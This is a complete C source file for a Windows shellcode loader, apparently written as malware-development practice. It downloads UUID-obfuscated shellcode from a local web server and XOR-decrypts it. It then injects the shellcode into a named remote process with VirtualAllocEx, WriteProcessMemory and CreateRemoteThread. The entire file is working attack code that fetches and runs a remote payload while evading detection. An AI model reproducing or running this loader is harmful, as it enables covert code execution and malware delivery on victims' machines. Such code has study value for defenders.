#include <Windows.h>
#include <wininet.h>
#include <Tlhelp32.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

#define NumberOfElements 17
// Python3 -m http.server 8080
// Have shellcodeuuid.txt in the directory
#define PAYLOAD L"http://10.211.55.2:8080/shellcodeuuid.txt"

// https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-uuidfromstringa
typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
    RPC_CSTR	StringUuid,
    UUID* Uuid
    );

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {

    PBYTE		pBuffer = NULL,
                TmpBuffer = NULL;

    SIZE_T		sBuffSize = NULL;

    RPC_STATUS 	STATUS = NULL;

    // Getting UuidFromStringA address from Rpcrt4.dll
    fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(TEXT("RPCRT4")), "UuidFromStringA");
    if (pUuidFromStringA == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Getting the real size of the shellcode which is the number of UUID strings * 16
    sBuffSize = NmbrOfElements * 16;

    // Allocating memory which will hold the deobfuscated shellcode
    //pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
    pBuffer = (PBYTE)VirtualAlloc(NULL, sBuffSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pBuffer == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Setting TmpBuffer to be equal to pBuffer
    TmpBuffer = pBuffer;

    // Loop through all the UUID strings saved in UuidArray
    for (int i = 0; i < NmbrOfElements; i++) {

        // Deobfuscating one UUID string at a time
        // UuidArray[i] is a single UUID string from the array UuidArray
        if ((STATUS = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer)) != RPC_S_OK) {
            // if it failed
            printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], STATUS);
            return FALSE;
        }

        // 16 bytes are written to TmpBuffer at a time
        // Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
        TmpBuffer = (PBYTE)(TmpBuffer + 16);

    }

    *ppDAddress = pBuffer;
    *pDSize = sBuffSize;

    return TRUE;
}

BOOL GetUUIDFromUrl(LPCWSTR szUrl, CHAR* UUID[]) {

    BOOL		bSTATE = TRUE;

    HINTERNET	hInternet = NULL,
                hUrl = NULL;

    // Read and store the UUIDs from the URL without null terminators
    char buffer[36]; // Assuming each UUID has 36 characters without a null terminator
    DWORD bytesRead;

    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
    hInternet = InternetOpenW(L"MalDevEin", NULL, NULL, NULL, NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Opening the handle to the payload using the payload's URL
    hUrl = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hUrl == NULL) {
        printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
        bSTATE = FALSE; goto _EndOfFunction;
    }

    for (int i = 0; i < NumberOfElements; i++) {
        if (!InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead)) {
            printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        // Allocate memory for the UUID and copy the buffer
        UUID[i] = (char*)malloc(bytesRead);
        if (UUID[i] == NULL) {
            perror("Error allocating memory");
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return -1;
        }
        memcpy(UUID[i], buffer, bytesRead);
    }


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);									// Closing handle 
    if (hUrl)
        InternetCloseHandle(hUrl);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    return bSTATE;
}

// change the random bytes
unsigned char randomKey[] = {
0xAA, 0xBB, 0xCC, 0xDD, 0xEE
};

/*
    - pShellcode : Base address of the payload to encrypt
    - sShellcodeSize : The size of the payload
    - bKey : A random array of bytes of specific size
    - sKeySize : The size of the key
*/

VOID XorFunction(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
    for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
        if (j > sKeySize) {
            j = 0;
        }
        pShellcode[i] = pShellcode[i] ^ bKey[j];
    }
}

/*
API functions used to perform process enumeration:

- CreateToolhelp32Snapshot: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot

- Process32First: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first

- Process32Next: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next

- OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

*/

// Gets the process handle of a process of name szProcessName
BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {

    HANDLE			hSnapShot = NULL;
    PROCESSENTRY32	Proc = {
                    .dwSize = sizeof(PROCESSENTRY32)
    };

    // Takes a snapshot of the currently running processes 
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    // Retrieves information about the first process encountered in the snapshot.
    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    do {

        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {

            DWORD	dwSize = lstrlenW(Proc.szExeFile);
            DWORD   i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            // Converting each charachter in Proc.szExeFile to a lowercase character and saving it
            // in LowerName to do the wcscmp call later

            if (dwSize < MAX_PATH * 2) {

                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = '\0';
            }
        }

        // Compare the enumerated process path with what is passed
        if (wcscmp(LowerName, szProcessName) == 0) {
            // Save the process ID 
            *dwProcessId = Proc.th32ProcessID;
            // Open a process handle and return
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

            break;
        }

        // Retrieves information about the next process recorded the snapshot.
        // while there is still a valid output ftom Process32Next, continue looping
    } while (Process32Next(hSnapShot, &Proc));



_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}




/*
API functions used to perform the code injection part:
- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex

- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory

- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex

- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
*/


BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {

    PVOID	pShellcodeAddress = NULL;

    SIZE_T	sNumberOfBytesWritten = NULL;
    DWORD	dwOldProtection = NULL;

    // Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    // Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
    printf("[#] Press <Enter> To Write Payload ... ");
    getchar();
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);

    // Cleaning the buffer of the shellcode in the local process
    memset(pShellcode, '\0', sSizeOfShellcode);

    // Setting memory permossions at pShellcodeAddress to be executable 
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Running the shellcode as a new thread's entry in the remote process
    printf("[#] Press <Enter> To Run ... ");
    getchar();
    printf("[i] Executing Payload ... ");
    if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] DONE !\n");

    VirtualFreeEx(hProcess, pShellcodeAddress, 0, MEM_RELEASE);

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    char* UuidArray[NumberOfElements];

    HANDLE		hProcess = NULL;
    DWORD		dwProcessId = NULL;

    PBYTE	Bytes = NULL;
    SIZE_T	Size = NULL;

    // Checking command line arguments
    if (argc < 2) {
        wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
        return -1;
    }

    // Getting a handle to the process
    wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
    if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
        printf("[!] Process is Not Found \n");
        return -1;
    }

    wprintf(L"[+] DONE \n");
    printf("[i] Found Target Process Pid: %d \n", dwProcessId);

    printf("[#] Press <Enter> To Read Payload from URL ... ");
    getchar();

    // Reading the payload 
    if (!GetUUIDFromUrl(PAYLOAD, &UuidArray)) {
        return -1;
    }

    // Now UuidArray contains the UUIDs read from the web server

    // You can print them to verify
    for (int i = 0; i < NumberOfElements; i++) {
        printf("UuidArray[%d]: %s\n", i, UuidArray[i]);
    }

    printf("[#] Press <Enter> To Decrypt ... ");
    getchar();
    printf("[i] Decrypting ...");

    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &Bytes, &Size)) {
        return -1;
    }

    XorFunction(Bytes, Size, randomKey, sizeof(randomKey));

    printf("[i] Bytes : 0x%p \n", Bytes);
    printf("[i] Size  : %ld \n", Size);

    printf("[#] Press <Enter> To Inject Shellcode to Target Process ... ");
    getchar();
    printf("[i] Injecting ...");

    // Injecting the shellcode
    if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size)) {
        return -1;
    }

    printf("[#] Press <Enter> To Quit ... ");
    getchar();

    CloseHandle(hProcess);
    // Free the executable buffer
    VirtualFree(Bytes, 0, MEM_RELEASE);

    // Don't forget to free the memory when done
    for (int i = 0; i < 17; i++) {
        free(UuidArray[i]);
    }

    return 0;
}
